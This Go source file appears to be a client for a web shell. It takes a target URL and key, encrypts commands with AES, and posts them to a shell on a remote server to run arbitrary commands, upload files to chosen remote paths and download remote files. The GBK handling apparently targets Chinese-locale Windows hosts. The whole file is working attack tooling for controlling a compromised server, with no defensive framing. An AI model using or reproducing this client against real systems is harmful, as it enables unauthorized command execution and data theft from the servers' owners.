package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)

var EVENT_EXEC = 0
var EVENT_UPLOAD = 1
var EVENT_DOWN = 2

var ENCODING = "GBK"
var SHELL_URL = ""
var SHELL_KEY = ""

var BINARY_MODE = 0

func GbkToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func Utf8ToGbk(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewEncoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func PKCS7Padding(cipherText []byte, blockSize int) []byte {
	padding := blockSize - len(cipherText)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(cipherText, padText...)
}

func PKCS7UnPadding(plainText []byte, blockSize int) ([]byte, error) {
	length := len(plainText)
	unpadding := int(plainText[length-1])

	if unpadding > aes.BlockSize || unpadding == 0 {
		return nil, errors.New("Invalid pkcs7 padding (unpadding > aes.BlockSize || unpadding == 0)")
	}

	pad := plainText[len(plainText)-unpadding:]
	for i := 0; i < unpadding; i++ {
		if pad[i] != byte(unpadding) {
			return nil, errors.New("Invalid pkcs7 padding (pad[i] != unpadding)")
		}
	}

	return plainText[:(length - unpadding)], nil
}

func TriggerEvent(event int, argument ...string) string {
	var data string
	if len(argument) == 1 {
		data = argument[0]
	} else {
		data = strings.Join(argument, "|")
	}

	data = fmt.Sprintf("%d,%s", event, data)

	v := url.Values{}
	v.Add("session", base64.StdEncoding.EncodeToString(EncryptData(SHELL_KEY, []byte(data))))
	v.Add("action", SHELL_KEY)

	resp, err := http.PostForm(SHELL_URL, v)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	out, _ := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	result := DecryptData(SHELL_KEY, out)

	if BINARY_MODE == 1 {
		return base64.StdEncoding.EncodeToString(result)
	}

	if ENCODING == "GBK" {
		result, _ = GbkToUtf8(result)
	}

	return string(result)
}

func ExecuteCmd(cmd string) string {
	return TriggerEvent(EVENT_EXEC, cmd)
}

func UploadFile(local, remote string) string {
	b, err := ioutil.ReadFile(local)
	if err != nil {
		log.Fatalln("Failed to read the file")
	}

	return TriggerEvent(EVENT_UPLOAD, remote, base64.StdEncoding.EncodeToString(b))
}

func DownFile(local, remote string) string {
	BINARY_MODE = 1
	data := TriggerEvent(EVENT_DOWN, remote)

	if data == "" {
		return "Failed"
	}

	fileBytes, _ := base64.StdEncoding.DecodeString(data)
	if err := ioutil.WriteFile(local, fileBytes, 0755); err != nil {
		return "Failed"
	}

	return "Success"
}

func EncryptData(key string, data []byte) []byte {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		log.Fatalln("key error")
	}

	iv := make([]byte, 16)
	rand.Read(iv)

	cbc := cipher.NewCBCEncrypter(block, iv)
	src := PKCS7Padding(data, block.BlockSize())

	crypted := make([]byte, len(src))
	cbc.CryptBlocks(crypted, src)

	return append(iv, crypted...)
}

func DecryptData(key string, data []byte) []byte {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		log.Fatalln("key error")
	}

	outbuf := make([]byte, len(data)-16)

	cbc := cipher.NewCBCDecrypter(block, data[:16])
	cbc.CryptBlocks(outbuf, data[16:])

	outbuf, _ = PKCS7UnPadding(outbuf, block.BlockSize())

	return outbuf
}

func main() {
	var command string
	var local, remote string
	var down bool

	flag.StringVar(&SHELL_URL, "url", "", "Target URL")
	flag.StringVar(&SHELL_KEY, "key", "", "Access key")
	flag.BoolVar(&down, "down", false, "Download the remote file instead upload file")
	flag.StringVar(&command, "cmd", "", "Command to execute, or left it bank to upload a file")
	flag.StringVar(&local, "file", "", "Local file you want to upload / saved")
	flag.StringVar(&remote, "rpath", "", "Remote file path (with the filename, C:\\\\1.txt etc, double backslash for Windows)")
	flag.StringVar(&ENCODING, "charset", "GBK", "Access key")
	flag.Parse()

	if SHELL_URL == "" || SHELL_KEY == "" {
		flag.PrintDefaults()
		return
	}

	if command != "" {
		fmt.Println(ExecuteCmd(command))
		return
	}

	if local != "" && remote != "" {
		if down {
			fmt.Println(DownFile(local, remote))
		} else {
			fmt.Println(UploadFile(local, remote))
		}
		return
	}

	flag.PrintDefaults()
}
